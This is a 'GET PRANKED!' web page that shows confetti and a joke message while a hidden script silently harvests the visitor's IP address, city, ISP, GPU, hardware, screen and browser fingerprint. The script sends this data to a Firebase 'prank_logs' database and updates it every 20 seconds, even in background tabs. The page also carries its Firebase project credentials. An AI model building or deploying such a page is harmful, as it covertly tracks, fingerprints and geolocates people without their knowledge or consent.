<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GET PRANKED! 🎉</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            background: linear-gradient(135deg, #121212, #1a1a2e);
            color: #fff;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            text-align: center;
        }
        .container {
            z-index: 10;
            padding: 20px;
        }
        h1 {
            font-size: 4rem;
            font-weight: 900;
            text-transform: uppercase;
            background: linear-gradient(45deg, #ff007f, #ffaa00, #00f0ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: pulse 1.5s infinite alternate;
            margin-bottom: 20px;
        }
        p {
            font-size: 1.5rem;
            color: #e0e0e0;
            font-weight: 300;
        }
        @keyframes pulse {
            from { transform: scale(1); }
            to { transform: scale(1.05); }
        }
        canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
</head>
<body>

    <canvas id="confetti-canvas"></canvas>

    <div class="container">
        <h1>GET PRANKED! 🎉</h1>
        <p>Gotcha! Hope this brightened your day.</p>
    </div>

    <!-- Firebase SDK Modules via CDN -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, push, update, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-analytics.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAO_ffupJOIMPE9m4ARtaqSzC1vGDkIAco",
            authDomain: "nexus-web-development-official.firebaseapp.com",
            databaseURL: "https://nexus-web-development-official-default-rtdb.firebaseio.com",
            projectId: "nexus-web-development-official",
            storageBucket: "nexus-web-development-official.firebasestorage.app",
            messagingSenderId: "553556577139",
            appId: "1:553556577139:web:128af196a1eb3dd5999306",
            measurementId: "G-1JW4TQFEG2"
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);
        const analytics = getAnalytics(app);

        // Track active page lifetime variables
        let currentRecordRef = null;
        let elapsedActiveSeconds = 0;
        let totalClickCounter = 0;

        // Tracks mouse clicks globally across the document to map user interaction
        document.addEventListener('click', () => { totalClickCounter++; });

        // Heavy-duty hardware profile extraction
        function extractHardwareSpecs() {
            let gpuVendor = "Unknown", gpuRenderer = "Unknown";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch (e) {}

            return {
                gpu_vendor_chipset: gpuVendor,
                gpu_renderer_architecture: gpuRenderer,
                logical_processor_threads: navigator.hardwareConcurrency || "Unknown",
                system_memory_limit_gb: navigator.deviceMemory || "Unknown",
                max_simultaneous_touch_points: navigator.maxTouchPoints || 0
            };
        }

        // Grabs performance metrics including JS heap allocations
        function capturePerformanceMetrics() {
            const memoryData = {};
            if (performance && performance.memory) {
                memoryData.allocated_heap_size = `${(performance.memory.usedJSHeapSize / 1048576).toFixed(2)} MB`;
                memoryData.total_allocated_pool = `${(performance.memory.totalJSHeapSize / 1048576).toFixed(2)} MB`;
                memoryData.maximum_heap_limit = `${(performance.memory.jsHeapLimit / 1048576).toFixed(2)} MB`;
            } else {
                Object.assign(memoryData, { allocated_heap_size: "Unsupported", total_allocated_pool: "Unsupported" });
            }
            return memoryData;
        }

        // Initialize unique record on start, then loop updates
        async function runTelemetryPipeline() {
            let ipAddress = "Unknown", geoData = {};
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (response.ok) {
                    const data = await response.json();
                    ipAddress = data.ip || "Unknown";
                    geoData = { city: data.city, region: data.region, country: data.country_name, isp: data.org };
                }
            } catch (e) {}

            // Compile immutable baseline parameters
            const baselinePayload = {
                network_profile: {
                    ip_address: ipAddress,
                    internet_provider: geoData.isp || "Unknown",
                    connection_mode: navigator.connection ? navigator.connection.effectiveType : "Unknown"
                },
                location_profile: {
                    city: geoData.city || "Unknown",
                    state_region: geoData.region || "Unknown",
                    country: geoData.country || "Unknown"
                },
                hardware_static_profile: extractHardwareSpecs(),
                display_profile: {
                    monitor_dimensions: `${window.screen.width}x${window.screen.height}`,
                    pixel_ratio_density: window.devicePixelRatio,
                    color_depth_bits: window.screen.colorDepth
                },
                browser_static_profile: {
                    user_agent_raw: navigator.userAgent,
                    kernel_platform: navigator.platform || "Unknown",
                    system_language: navigator.language,
                    configured_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                },
                live_dynamic_telemetry: {
                    time_spent_seconds: 0,
                    interaction_clicks: 0,
                    document_visibility_state: document.visibilityState,
                    performance_heap_allocation: capturePerformanceMetrics(),
                    last_synchronized_time: serverTimestamp()
                }
            };

            // Set push location target folder
            const logsRef = ref(database, 'prank_logs');
            currentRecordRef = push(logsRef);
            
            // Push initial record block
            await update(currentRecordRef, baselinePayload)
                .catch((err) => console.error("Initial sync fault:", err));

            // Start 20-second dynamic synchronization cycle
            setInterval(async () => {
                // Keep evaluating runtime metrics even if the tab moves to background
                elapsedActiveSeconds += 20;
                await syncDynamicMetrics();
            }, 20000);
        }

        // Updates mutable payload changes over the active interval loop
        async function syncDynamicMetrics() {
            if (!currentRecordRef) return;

            const updatedTelemetry = {
                "live_dynamic_telemetry/time_spent_seconds": elapsedActiveSeconds,
                "live_dynamic_telemetry/interaction_clicks": totalClickCounter,
                "live_dynamic_telemetry/document_visibility_state": document.visibilityState,
                "live_dynamic_telemetry/performance_heap_allocation": capturePerformanceMetrics(),
                "live_dynamic_telemetry/last_synchronized_time": serverTimestamp()
            };

            // Safely push only the variable updates to the existing record node
            update(currentRecordRef, updatedTelemetry)
                .catch((e) => console.error("Periodic update cycle dropped:", e));
        }

        // Immediate callback update when tab switches visibility
        document.addEventListener('visibilitychange', () => {
            if (currentRecordRef) syncDynamicMetrics();
        });

        runTelemetryPipeline();
    </script>

    <!-- Continuous Confetti Engine -->
    <script>
        const myCanvas = document.getElementById('confetti-canvas');
        const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 };

        function randomInRange(min, max) {
            return Math.random() * (max - min) + min;
        }

        setInterval(function() {
            confetti({ ...defaults, particleCount: 35, origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 } });
            confetti({ ...defaults, particleCount: 35, origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 } });
        }, 250);
    </script>
</body>
</html>
